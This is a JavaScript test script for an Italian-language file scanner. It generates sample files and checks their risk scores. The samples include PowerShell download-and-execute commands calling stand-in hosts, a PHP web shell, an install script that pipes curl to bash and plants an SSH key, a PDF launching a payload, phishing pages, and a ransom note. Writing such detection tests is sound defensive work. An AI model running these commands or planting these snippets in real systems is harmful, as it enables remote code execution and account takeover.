// Created by anvex2012
'use strict';
/* Generates test samples (harmless) on the fly and checks the scores */
const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');

// Isolated data folder and fixed language: the checks below match Italian texts
process.env.GAUNTLER_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-eng-home-'));
process.env.GAUNTLER_LANG = 'it';
const { scanFile, scanBuffer } = require('../core');

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-test-'));
const EICAR = ['X5O!P%@AP[4\\PZX54(P^)7CC)7}$', 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'].join('');

function crc32(buf) {
  let c, crc = 0xffffffff;
  for (let n = 0; n < buf.length; n++) {
    c = (crc ^ buf[n]) & 0xff;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    crc = (crc >>> 8) ^ c;
  }
  return (crc ^ 0xffffffff) >>> 0;
}
function makeZip(files) {
  const locals = [], centrals = [];
  let off = 0;
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content);
    const comp = zlib.deflateRawSync(data);
    const nb = Buffer.from(name);
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(8, 8);
    lh.writeUInt32LE(crc32(data), 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(nb.length, 26);
    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(8, 10);
    ch.writeUInt32LE(crc32(data), 16); ch.writeUInt32LE(comp.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(nb.length, 28); ch.writeUInt32LE(off, 42);
    locals.push(lh, nb, comp); centrals.push(ch, nb);
    off += 30 + nb.length + comp.length;
  }
  const cd = Buffer.concat(centrals);
  const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(centrals.length / 2, 8); end.writeUInt16LE(centrals.length / 2, 10);
  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...locals, cd, end]);
}
function zipCryptoEncrypt(data, password, crc) {
  const T = []; for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; T[n] = c >>> 0; }
  const cu = (crc, b) => (T[(crc ^ b) & 0xff] ^ (crc >>> 8)) >>> 0;
  let k0 = 0x12345678, k1 = 0x23456789, k2 = 0x34567890;
  const upd = (c) => { k0 = cu(k0, c); k1 = (Math.imul((k1 + (k0 & 0xff)) | 0, 134775813) + 1) >>> 0; k2 = cu(k2, k1 >>> 24); };
  for (const c of Buffer.from(password)) upd(c);
  const plain = Buffer.concat([require('crypto').randomBytes(11), Buffer.from([crc >>> 24]), data]);
  const out = Buffer.alloc(plain.length);
  for (let i = 0; i < plain.length; i++) { const t = (k2 | 2) & 0xffff; out[i] = plain[i] ^ (((t * (t ^ 1)) >>> 8) & 0xff); upd(plain[i]); }
  return out;
}
function makeZipEncrypted(name, content, password) {
  const data = Buffer.from(content), crc = crc32(data);
  const comp = zipCryptoEncrypt(zlib.deflateRawSync(data), password, crc);
  const nb = Buffer.from(name);
  const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(1, 6); lh.writeUInt16LE(8, 8);
  lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(nb.length, 26);
  const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(1, 8); ch.writeUInt16LE(8, 10);
  ch.writeUInt32LE(crc, 16); ch.writeUInt32LE(comp.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(nb.length, 28); ch.writeUInt32LE(0, 42);
  const cd = Buffer.concat([ch, nb]);
  const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(1, 8); end.writeUInt16LE(1, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(30 + nb.length + comp.length, 16);
  return Buffer.concat([lh, nb, comp, cd, end]);
}
function makeTar(files) {
  const parts = [];
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content);
    const h = Buffer.alloc(512);
    h.write(name, 0); h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116);
    h.write(data.length.toString(8).padStart(11, '0') + '\0', 124); h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156); h.write('ustar\0', 257); h.write('00', 263);
    let sum = 0; for (const b of h) sum += b; h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
    parts.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  parts.push(Buffer.alloc(1024));
  return Buffer.concat(parts);
}
function makeGpsJpeg() {
  const tiff = Buffer.alloc(200);
  tiff.write('II', 0); tiff.writeUInt16LE(42, 2); tiff.writeUInt32LE(8, 4);
  tiff.writeUInt16LE(1, 8); tiff.writeUInt16LE(0x8825, 10); tiff.writeUInt16LE(4, 12); tiff.writeUInt32LE(1, 14); tiff.writeUInt32LE(26, 18); tiff.writeUInt32LE(0, 22);
  let o = 26; tiff.writeUInt16LE(4, o); o += 2;
  const ent = (tag, type, count, val) => { tiff.writeUInt16LE(tag, o); tiff.writeUInt16LE(type, o + 2); tiff.writeUInt32LE(count, o + 4); if (typeof val === 'string') tiff.write(val, o + 8); else tiff.writeUInt32LE(val, o + 8); o += 12; };
  ent(1, 2, 2, 'N\0'); ent(2, 5, 3, 100); ent(3, 2, 2, 'E\0'); ent(4, 5, 3, 124);
  tiff.writeUInt32LE(0, o);
  const rat = (off, a) => a.forEach((v, i) => { tiff.writeUInt32LE(v, off + i * 8); tiff.writeUInt32LE(1, off + i * 8 + 4); });
  rat(100, [45, 27, 50]); rat(124, [9, 11, 24]);
  const app1 = Buffer.concat([Buffer.from('Exif\0\0', 'latin1'), tiff]);
  const len = Buffer.alloc(2); len.writeUInt16BE(app1.length + 2);
  return Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe1]), len, app1, Buffer.alloc(500, 9), Buffer.from([0xff, 0xd9])]);
}
function makePdfHiddenJs() {
  const js = zlib.deflateSync(Buffer.from('var x = unescape("%u9090%u9090"); eval(x); app.launchURL("http://45.12.33.9/payload.exe");'));
  return Buffer.concat([Buffer.from('%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS 3 0 R >> endobj\n3 0 obj << /Length ' + js.length + ' /Filter /FlateDecode >>\nstream\n', 'latin1'), js, Buffer.from('\nendstream\nendobj\n%%EOF\n', 'latin1')]);
}

function makePE() {
  const b = Buffer.alloc(0x400);
  b.write('MZ', 0); b.writeUInt32LE(0x40, 0x3c); b.write('PE\0\0', 0x40, 'latin1');
  const coff = 0x44;
  b.writeUInt16LE(0x14c, coff); b.writeUInt16LE(1, coff + 2); b.writeUInt32LE(1700000000, coff + 4); b.writeUInt16LE(0xe0, coff + 16); b.writeUInt16LE(0x102, coff + 18);
  const opt = coff + 20;
  b.writeUInt16LE(0x10b, opt); b.writeUInt32LE(0x1000, opt + 16); b.writeUInt16LE(2, opt + 68); b.writeUInt16LE(0, opt + 70); b.writeUInt32LE(16, opt + 92);
  const sec = opt + 0xe0;
  b.write('.text', sec, 'latin1'); b.writeUInt32LE(0x200, sec + 8); b.writeUInt32LE(0x1000, sec + 12); b.writeUInt32LE(0x200, sec + 16); b.writeUInt32LE(0x200, sec + 20); b.writeUInt32LE(0xe0000020, sec + 36);
  return b;
}

const ps = "powershell -nop -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.22.33.44/a.ps1')\"";
const psEnc = 'powershell -enc ' + Buffer.from(ps, 'utf16le').toString('base64');
const cases = [
  { name: 'eicar.com', data: EICAR, max: 10 },
  { name: 'pulito.txt', data: 'Ciao, questa è una semplice nota della spesa: latte, pane, uova.\n', min: 90 },
  { name: 'dropper.ps1', data: ps + '\n', max: 40 },
  { name: 'nascosto.bat', data: '@echo off\r\n' + psEnc + '\r\n', max: 40 },
  { name: '.env', data: 'DB_HOST=localhost\nDB_PASSWORD=Sup3rS3gr3t0!2024\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLQ\nSTRIPE_KEY=sk_live_51Hxxabcdefghijklmnopqrstuvwx\nGITHUB_TOKEN=ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8' + '\n', max: 30 },
  { name: 'id_rsa', data: '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n-----END OPENSSH PRIVATE KEY-----\n', max: 30 },
  { name: 'fattura.pdf.exe', data: makePE(), max: 30 },
  { name: 'documento.pdf', data: '%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /JavaScript /JS (app.alert(unescape("%u4141")); eval(x)) >> endobj\n3 0 obj << /Type /Page >> endobj\n%%EOF', max: 50 },
  { name: 'clienti.csv', data: 'nome,carta,iban\nMario Rossi,4111 1111 1111 1111,IT60X0542811101000000123456\nLuca Bianchi,5555555555554444,\nAnna,4012888888881881,\nPaolo,378282246310005,\n', max: 45 },
  { name: 'archivio.zip', data: makeZip({ 'leggimi.txt': 'ciao', 'setup.js': 'var s=new ActiveXObject("WScript.Shell");s.Run("powershell -w hidden IEX (New-Object Net.WebClient).DownloadString(\'http://evil.tk/p\')");' }), max: 40 },
  { name: 'foto.jpg', data: Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(2000, 7), Buffer.from([0xff, 0xd9]), makePE(), Buffer.alloc(1024)]), max: 30 },
  { name: 'dati.bin', data: require('crypto').randomBytes(200000), max: 75 },
  { name: 'login.html', data: '<html><body><h1>Microsoft Office 365</h1><p>Your account suspended, verify your account</p><form action="https://collect.evil.xyz/p.php"><input type="password" name="p"></form><script>document.write(atob("PGgxPmhpPC9oMT4="))</script></body></html>', max: 60 },
  { name: 'shell.php', data: '<?php if(isset($_POST["c"])){ system($_POST["c"]); } eval(base64_decode("ZWNobyAxOw==")); ?>', max: 25 },
  { name: 'campioni.zip', data: makeZipEncrypted('dropper.ps1', 'IEX (New-Object Net.WebClient).DownloadString("http://evil.top/x")', 'infected'), max: 39, expect: /password "infected"|File interno sospetto/ },
  { name: 'loader.js', data: 'var p = "' + Buffer.from('var s = atob("' + Buffer.from(ps).toString('base64') + '"); eval(s);').toString('base64') + '";\neval(atob(p));\n', max: 39, expect: /Nascosto/ },
  { name: 'auth.js', data: 'function isAdmin(user) {\n  if (user.role !== "user\u202E \u2066// admin\u2069 \u2066") {\n    return true;\n  }\n}\n', max: 70, expect: /Trojan Source/ },
  { name: 'avviso.eml', data: 'From: "Poste Italiane" <noreply@poste-sicurezza-login.xyz>\nReply-To: recupero@gmail.com\nSubject: URGENTE: il tuo account è stato sospeso\nAuthentication-Results: mx.google.com; spf=fail; dkim=fail; dmarc=fail\n\nGentile cliente,\nabbiamo rilevato attività sospetta. Il tuo account sospeso verrà chiuso entro 24 ore.\nClicca qui per verificare il tuo account e inserisci la password: https://poste-sicurezza-login.xyz/login\n', max: 39, expect: /phishing|SPF/ },
  { name: 'vacanze.jpg', data: makeGpsJpeg(), max: 89, expect: /posizione GPS/ },
  { name: 'nascosto.pdf', data: makePdfHiddenJs(), max: 39, expect: /JavaScript PDF pericoloso/ },
  { name: 'pacchetto.tar', data: makeTar({ 'install.sh': 'curl -s http://1.2.3.4/x | bash\nchmod +x /tmp/x; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7examplekeyexamplekeyexamplekey attacker" >> ~/.ssh/authorized_keys\n', 'README': 'ok' }), max: 39, expect: /install\.sh/ },
  { name: 'note.txt', data: 'Your files have been encrypted! To decrypt your files send 0.5 bitcoin wallet bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh contact abcdefghijklmnop.onion', max: 25 },
];

(async () => {
  let fail = 0;
  for (const c of cases) {
    const p = path.join(dir, c.name);
    fs.writeFileSync(p, c.data);
    const r = await scanFile(p);
    const all = r.findings.map((f) => f.title + ' ' + f.detail).join('\n');
    const ok = (c.max === undefined || r.overall.score <= c.max) && (c.min === undefined || r.overall.score >= c.min) && (!c.expect || c.expect.test(all));
    if (!ok) fail++;
    console.log(`${ok ? '✔' : '✘'} ${c.name.padEnd(18)} ${String(r.overall.score).padStart(3)}/100  ${r.overall.verdict.padEnd(14)} ${r.findings.filter(f => f.severity !== 'info').slice(0, 3).map(f => f.title).join(' | ')}`);
  }
  const b = await scanBuffer(Buffer.from(EICAR), 'mem.txt');
  if (b.overall.score > 10) { fail++; console.log('✘ scanBuffer EICAR', b.overall.score); } else console.log('✔ scanBuffer EICAR', b.overall.score);
  fs.rmSync(dir, { recursive: true, force: true });
  fs.rmSync(process.env.GAUNTLER_HOME, { recursive: true, force: true });
  console.log(fail ? `\n${fail} test falliti` : '\nTutti i test superati');
  process.exit(fail ? 1 : 0);
})();
